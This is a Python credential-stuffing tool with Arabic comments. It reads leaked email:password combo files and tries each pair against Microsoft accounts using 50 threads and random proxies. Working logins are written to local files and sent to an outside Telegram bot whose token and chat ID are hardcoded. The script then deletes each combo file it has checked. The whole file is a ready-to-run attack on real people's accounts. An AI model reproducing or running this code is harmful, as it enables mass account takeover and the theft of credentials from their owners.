import random
import threading
import pyfiglet
import requests
from mailhub import MailHub
from concurrent.futures import ThreadPoolExecutor
import os

logo = pyfiglet.figlet_format('MASA')
print(logo)

mail = MailHub()
write_lock = threading.Lock()

# تعريف التوكن و ID كقيم ثابتة
TELEGRAM_BOT_TOKEN = "8466577696:AAEF6teJ_dVgAmbZHBDWgjHJ8KYPAQhuHWs"
TELEGRAM_CHAT_ID = "7957784778"

def validate_line(line):
    parts = line.strip().split(":")
    if len(parts) == 2:
        return parts[0], parts[1]
    else:
        return None, None

def attempt_login(email, password, proxy, hits_file, local_hits_file, counters):
    try:
        res = mail.loginMICROSOFT(email, password, proxy)[0]
        if res == "ok":
            print(f"Valid   | {email}:{password}")
            with write_lock:
                hits_file.write(f"{email}:{password}\n")
                hits_file.flush()
                local_hits_file.write(f"{email}:{password}\n")
                local_hits_file.flush()
                send_to_telegram(email, password)
            counters['valid'] += 1  
        else:
            print(f"Invalid | {email}:{password}")
            counters['invalid'] += 1  
    except Exception as e:
        print(f"Error logging in {email}:{password} - {str(e)}")

def send_to_telegram(email, password):
    message = f"""
Valid Acc : {email}:{password}
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Successfully sent to Telegram!")
        else:
            print(f"Failed to send to Telegram. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while sending to Telegram: {e}")

def process_combo_file(hits_file, local_hits_file, proxies, combo_path):
    counters = {'valid': 0, 'invalid': 0}  
    try:
        with open(combo_path, "r") as file:
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = []
                for line in file:
                    email, password = validate_line(line)
                    if email is None or password is None:
                        print(f"Invalid format in line: {line.strip()}")
                        continue
                    proxy = {"http": f"http://{random.choice(proxies).strip()}"} if proxies else None
                    futures.append(executor.submit(attempt_login, email, password, proxy, hits_file, local_hits_file, counters))
                for future in futures:
                    future.result()
    except Exception as e:
        print(f"Error processing combo file: {e}")
    
    print(f"\nTotal Valid Accounts: {counters['valid']}")
    print(f"Total Invalid Accounts: {counters['invalid']}")

def main():
    proxy_path = input("Enter the path to the proxy file (or press Enter to skip): ")

    # الحصول على جميع ملفات combo في الدليل الحالي
    combo_files = [f for f in os.listdir('.') if f.endswith('.txt') and f != 'masa_hits.txt' and f != 'temp_hits.txt']

    if not combo_files:
        print("No combo files found in the current directory.")
        return

    proxies = []
    if proxy_path:
        if not os.path.exists(proxy_path):
            print("Proxy file does not exist.")
            return
        with open(proxy_path, "r") as proxy_file:
            proxies = proxy_file.readlines()

    for combo_file in combo_files:
        print(f"Processing file: {combo_file}")
        with open("masa_hits.txt", "a", encoding="utf-8") as local_hits_file:
            with open("temp_hits.txt", "w", encoding="utf-8") as temp_file:
                print("Starting login attempts...")
                process_combo_file(temp_file, local_hits_file, proxies, combo_file)
                print("Login attempts finished.")
        os.remove(combo_file)  # حذف الملف بعد الفحص

if __name__ == "__main__":
    main()
